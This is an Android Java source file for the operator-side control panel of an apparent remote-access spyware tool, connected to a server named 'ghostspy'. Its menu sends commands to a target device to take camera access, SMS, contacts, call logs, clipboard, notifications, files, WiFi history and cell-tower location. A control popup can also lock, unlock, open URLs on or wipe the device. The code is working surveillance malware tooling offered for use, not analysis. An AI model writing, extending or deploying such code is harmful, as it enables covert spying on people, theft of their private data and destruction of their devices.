package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.view.animation.ScaleAnimation;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView info = new TextView(this);
        info.setText(model + " | Bat: " + battery + "%");
        info.setTextColor(0xFFFFFFFF);
        info.setPadding(12, 6, 12, 6);
        info.setBackgroundColor(0xFF171717);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        info.setLayoutParams(infoParams);
        info.setGravity(Gravity.CENTER);
        header.addView(info);

        TextView notif = new TextView(this);
        notif.setText("2");
        notif.setTextColor(0xFFFFFFFF);
        notif.setBackground(getDrawable(R.drawable.btn_admin));
        notif.setPadding(10, 4, 10, 4);
        header.addView(notif);
        root.addView(header);

        // Grid Menu 2 kolom
        ScrollView scroll = new ScrollView(this);
        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        grid.setPadding(16, 12, 16, 12);

        String[][] items = {
            {"📷", "Kamera", "#FF1744", "start_camera"},
            {"💬", "SMS", "#FF4D8D", "get_sms"},
            {"👥", "Kontak", "#00E676", "get_contacts"},
            {"📞", "Panggilan", "#FFC107", "get_calls"},
            {"📋", "Clipboard", "#2ED8FF", "get_clipboard"},
            {"📦", "Aplikasi", "#2196F3", "get_apps"},
            {"🌐", "Jaringan", "#9C27B0", "get_network"},
            {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
            {"📶", "WiFi Scan", "#00BCD4", "wifiscan"},
            {"📁", "File Mgr", "#FF5722", "list_files"},
            {"📡", "Cell Tower", "#607D8B", "celltower"},
            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 2 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            row.addView(createMenuCard(items[i]));
        }
        scroll.addView(grid);
        root.addView(scroll);

        // Control Center (dummy, bisa di-swipe nanti)
        TextView controlCenter = new TextView(this);
        controlCenter.setText("🎛️ Control Center");
        controlCenter.setTextColor(0xFFFFFFFF);
        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
        controlCenter.setPadding(16, 12, 16, 12);
        controlCenter.setGravity(Gravity.CENTER);
        controlCenter.setOnClickListener(v -> showControlPopup());
        root.addView(controlCenter);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    private LinearLayout createMenuCard(String[] item) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
        card.setPadding(8, 20, 8, 20);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, 150, 1);
        params.setMargins(6, 6, 6, 6);
        card.setLayoutParams(params);

        TextView icon = new TextView(this);
        icon.setText(item[0]);
        icon.setTextSize(28);
        icon.setGravity(Gravity.CENTER);

        TextView label = new TextView(this);
        label.setText(item[1]);
        label.setTextColor(0xFFFFFFFF);
        label.setTextSize(12);
        label.setGravity(Gravity.CENTER);
        label.setPadding(0, 8, 0, 0);

        card.addView(icon);
        card.addView(label);

        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(150);
            scale.setRepeatCount(0);
            v.startAnimation(scale);
            handleAction(item[3]);
        });

        return card;
    }

    private void handleAction(String cmd) {
        Intent i = null;
        switch (cmd) {
            case "start_camera": i = new Intent(this, CameraActivity.class); break;
            case "get_sms": i = new Intent(this, SmsActivity.class); break;
        }
        if (i != null) {
            i.putExtra("deviceId", deviceId);
            startActivity(i);
        } else {
            sendCmd(cmd);
        }
    }

    private void showControlPopup() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🎛️ Control Center");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        String[] cmds = {"flashlight", "vibrate", "lock", "unlock", "toast", "openurl", "wipe"};
        for (String cmd : cmds) {
            Button btn = new Button(this);
            btn.setText(cmd);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFF171717);
            btn.setOnClickListener(v -> sendCmd(cmd));
            lay.addView(btn);
        }
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void sendCmd(String cmd) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", new JSONObject());
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        }
    }
}
